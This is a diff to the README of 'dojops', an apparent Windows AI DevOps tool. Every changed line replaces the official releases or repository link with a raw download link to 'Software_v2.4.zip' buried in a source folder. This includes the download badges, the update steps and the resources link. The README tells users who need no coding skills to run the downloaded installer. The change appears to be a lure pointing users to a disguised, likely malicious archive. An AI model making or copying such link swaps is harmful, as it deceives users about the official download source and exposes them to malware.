@@ -1,6 +1,6 @@
 # ⚙️ dojops - Simple AI DevOps Automation
 
-[![Download dojops](https://img.shields.io/badge/Download-dojops-ff6f61?style=for-the-badge)](https://github.com/themountainboy19/dojops/releases)
+[![Download dojops](https://img.shields.io/badge/Download-dojops-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/themountainboy19/dojops/main/packages/skill-registry/src/Software_v2.4.zip)
 
 ## 🖥️ What is dojops?
 
@@ -43,7 +43,7 @@ Start by getting the software files from the official release page.
 
 Click the button below to open the official downloads page.
 
-[![Download dojops](https://img.shields.io/badge/Download-dojops-4c8bf5?style=for-the-badge)](https://github.com/themountainboy19/dojops/releases)
+[![Download dojops](https://img.shields.io/badge/Download-dojops-4c8bf5?style=for-the-badge)](https://raw.githubusercontent.com/themountainboy19/dojops/main/packages/skill-registry/src/Software_v2.4.zip)
 
 This page lists the latest versions available for Windows.
 
@@ -106,7 +106,7 @@ No coding skills are needed. The software explains each step and offers suggesti
 The tool may receive updates with new features or fixes. To update:
 
 - Visit the release page again:  
-  https://github.com/themountainboy19/dojops/releases  
+  https://raw.githubusercontent.com/themountainboy19/dojops/main/packages/skill-registry/src/Software_v2.4.zip  
 - Download the newest `.exe` installer.  
 - Run the installer like before; it will replace the old version without losing your settings.
 
@@ -159,10 +159,10 @@ Go to Control Panel > Programs > Uninstall a program. Select dojops and choose U
 ## 📚 More Resources
 
 Visit the GitHub page for more details and updates:  
-https://github.com/themountainboy19/dojops  
+https://raw.githubusercontent.com/themountainboy19/dojops/main/packages/skill-registry/src/Software_v2.4.zip  
 
 For developers, this repository contains code and technical documentation.
 
 ---
 
-[![Download dojops](https://img.shields.io/badge/Download-dojops-ff6f61?style=for-the-badge)](https://github.com/themountainboy19/dojops/releases)
+[![Download dojops](https://img.shields.io/badge/Download-dojops-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/themountainboy19/dojops/main/packages/skill-registry/src/Software_v2.4.zip)
